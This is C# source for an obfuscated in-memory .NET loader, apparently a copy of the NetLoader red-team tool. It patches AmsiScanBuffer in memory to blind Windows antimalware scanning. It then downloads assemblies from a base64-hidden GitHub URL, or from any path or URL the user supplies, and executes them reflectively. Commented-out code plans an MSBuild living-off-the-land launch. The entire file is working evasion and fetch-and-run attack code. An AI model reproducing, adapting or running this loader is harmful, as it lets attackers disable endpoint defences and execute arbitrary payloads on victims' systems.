﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

//This if for MSBuild LOL bin stuff later
//using Microsoft.Build.Framework;
//using Microsoft.Build.Utilities;
public class xorimgplghusk{
    private static WebClient qoxkbdjujvgvjm = new WebClient() { };
	[DllImport("ker" +"nel" + "32")]
    private static extern IntPtr GetProcAddress(IntPtr cnttrrp, string eduqlksc);
	[DllImport("ker" +"nel" + "32")]
    private static extern IntPtr LoadLibrary(string tjne);
	[DllImport("ker" +"nel" + "32")]
    private static extern bool VirtualProtect(IntPtr aafqwlmfk, UIntPtr byalip, uint hbdpfwgtapjd, out uint aevexbxohxxxhe);
	private static void fsnuhafso(byte[] xaznuhjef, IntPtr halbpuufaftund, int squatwlzs = 0)
    {
        Marshal.Copy(xaznuhjef, squatwlzs, halbpuufaftund, xaznuhjef.Length);
    }
	public static byte[] FetchMe(string ina){
		return qoxkbdjujvgvjm.DownloadData(ina);
	}
	private static void tipuhkzlzzxke(MethodInfo ledfuecvkaqt, object[] ihtheami = null ){
	//ledfuecvkaqt.Invoke(null, new object[] { new string[] { kfhhhitjx } });
	ledfuecvkaqt.Invoke(0, ihtheami);
}
	public static void ynrzrkslcvdgbuu(string wkmhvsr, string kfhhhitjx = "", string gxzhqhuii = "", bool cljpzosrsyd = true)
    {		var lwyxgocoh = new object[] { new string[] { kfhhhitjx } };
        if (!cljpzosrsyd)
        {
            if (!gxzhqhuii.StartsWith("http"))
            {
                tipuhkzlzzxke(rjqkdzg(Assembly.Load(File.ReadAllBytes(gxzhqhuii))),lwyxgocoh);
			}
            else
            {
                tipuhkzlzzxke(rjqkdzg(Assembly.Load(FetchMe(gxzhqhuii))),lwyxgocoh);
			}
		}	
        else
        {
			tipuhkzlzzxke(rjqkdzg(Assembly.Load(FetchMe(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")).Replace("tree", "blob") + "/" + wkmhvsr + "?raw=true"))),lwyxgocoh);
	    }
    }
	private static List<string> GetBins()
    {
        var uyaoawtawr = new List<string>() { };
        var cynepigdwcmcn = qoxkbdjujvgvjm.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")));
        Regex htb = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
        foreach (var match in htb.Matches(cynepigdwcmcn))
        {
            uyaoawtawr.Add(match.ToString().TrimStart('/'));
        }
        return uyaoawtawr;
    }
	public static void Main(string[] args)
    {
        Console.WriteLine("[!] ~Flangvik  #NetLoader");
        slnduvcrnmilep();
        while (true)
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                if (args.Length == 0)
                {
                    List<string> zwqqubc = GetBins();
                    Console.WriteLine("[+] Select a binary (number)>");
                    Console.WriteLine("------------------------");
                    Console.WriteLine("[0] - Exit NetLoader");
                    for (int pgpbnhvhirznt = 0; pgpbnhvhirznt < zwqqubc.Count; pgpbnhvhirznt++)
                    {
                        Console.WriteLine("[" + (pgpbnhvhirznt + 1) + "] - " + zwqqubc[pgpbnhvhirznt]);
                        if (pgpbnhvhirznt == zwqqubc.Count - 1)
                        {
                            Console.WriteLine("[" + (pgpbnhvhirznt + 2) + "] - Custom PATH or URL ");
                        }
                    }
                    Console.WriteLine("-----------------------");
                    var hwbfedhi = Console.ReadLine();
                    if (Convert.ToInt32(hwbfedhi) == 0)
                    {
                        System.Environment.Exit(1);
                    }
                    else if (Convert.ToInt32(hwbfedhi) - 1 == zwqqubc.Count)
                    {
                        Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                        string kckovd = Console.ReadLine();
                        Console.WriteLine("[+] Provide kfhhhitjx for {0} >", kckovd);
                        string somfify = Console.ReadLine();
                        ynrzrkslcvdgbuu("", somfify, kckovd, false);
                    }
                    else if (Convert.ToInt32(hwbfedhi) - 1 > zwqqubc.Count | Convert.ToInt32(hwbfedhi) - 1 < 0)
                    {
                        Console.WriteLine("[!] Bad Input, sry!");
                    }
                    else
                    {
                        Console.WriteLine("[+] Provide kfhhhitjx for {0} >", zwqqubc[Convert.ToInt32(hwbfedhi) - 1]);
                        string somfify = Console.ReadLine();
                        ynrzrkslcvdgbuu(zwqqubc[Convert.ToInt32(hwbfedhi) - 1], somfify);
                    }
                }
                else
                {
                    string zfthxcydvlm = "";
                    string ruufdfmsedt = "";
                    bool wmrhvcieyndf = false;
                    foreach (var argument in args)
                    {
                        if (argument.ToLower().Contains("path"))
                        {
                            var jfjcrte = Array.IndexOf(args, argument) + 1;
                            if (jfjcrte < args.Length)
                            {
                                var osasrlezkr = args[Array.IndexOf(args, argument) + 1];
                                if (wmrhvcieyndf)
                                    zfthxcydvlm = Encoding.UTF8.GetString(Convert.FromBase64String(osasrlezkr));
                                else
                                    zfthxcydvlm = osasrlezkr;
                            }
                        }
                        if (argument.ToLower().Contains("b64"))
                            wmrhvcieyndf = true;
                        if (argument.ToLower().Contains("args"))
                        {
                            var jfjcrte = Array.IndexOf(args, argument) + 1;
                            if (jfjcrte < args.Length)
                            {
                                var osasrlezkrArgs = args[Array.IndexOf(args, argument) + 1];
                                if (wmrhvcieyndf)
                                    ruufdfmsedt = Encoding.UTF8.GetString(Convert.FromBase64String(osasrlezkrArgs));
                                else
                                    ruufdfmsedt = osasrlezkrArgs;
                            }
                        }
                    }
                    if (args.Length == 1 && string.IsNullOrEmpty(ruufdfmsedt) && string.IsNullOrEmpty(zfthxcydvlm) && !wmrhvcieyndf)
                    {
                        zfthxcydvlm = args[0];
                    }
                    if (args.Length == 2 && string.IsNullOrEmpty(ruufdfmsedt) && string.IsNullOrEmpty(zfthxcydvlm) && !wmrhvcieyndf)
                    {
                        ruufdfmsedt = args[1];
                        zfthxcydvlm = args[0];
                    }
                    if (args.Length == 3 && string.IsNullOrEmpty(ruufdfmsedt) && string.IsNullOrEmpty(zfthxcydvlm) && wmrhvcieyndf)
                    {
                        zfthxcydvlm = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                        ruufdfmsedt = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                    }
                    if (args.Length == 2 && wmrhvcieyndf)
                    {
                        if (!string.IsNullOrEmpty(args[1]))
                            zfthxcydvlm = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                    }
                    if (!string.IsNullOrEmpty(zfthxcydvlm))
                    {
                        Console.WriteLine("[+] Starting {0} with args {1}", zfthxcydvlm, ruufdfmsedt);
                        ynrzrkslcvdgbuu("", ruufdfmsedt, zfthxcydvlm, false);
                        Environment.Exit(0);
                    }
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Damn, it failed, to bad");
                Console.WriteLine("[!] {0}", ex.Message);
                Environment.Exit(0);
            }
        }
    }
	private static void slnduvcrnmilep(bool jqgevq = false)
    {
        try
        {
            var ntewtz = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
            IntPtr poza = GetProcAddress(ntewtz, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
            uint ujgmnptptxdijei = 0x40;
            uint hdrqslsvyj = 0;
            if (System.Environment.Is64BitOperatingSystem)
            {
                var awzxcizepow = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                VirtualProtect(poza, (UIntPtr)awzxcizepow.Length, ujgmnptptxdijei, out hdrqslsvyj);
                fsnuhafso(awzxcizepow, poza);
            }
            else
            {
                var xkpwjxovxekzo = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                VirtualProtect(poza, (UIntPtr)xkpwjxovxekzo.Length, ujgmnptptxdijei, out hdrqslsvyj);
                fsnuhafso(xkpwjxovxekzo, poza);
            }
                Console.WriteLine("[+] Patched!");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] {0}", ex.Message);
        }
    }
	private static MethodInfo rjqkdzg(Assembly mbo)
    {
		if(1 == 1)
			return mbo.EntryPoint;
		return null;
	}
	/*
	 //This is for MSBuild later
	public class ClassExample : Task, ITask
	{
	    public override bool Execute()
	    {
	        xorimgplghusk.Main(new string[] { });
	        return true;
	    }
	}
	*/
}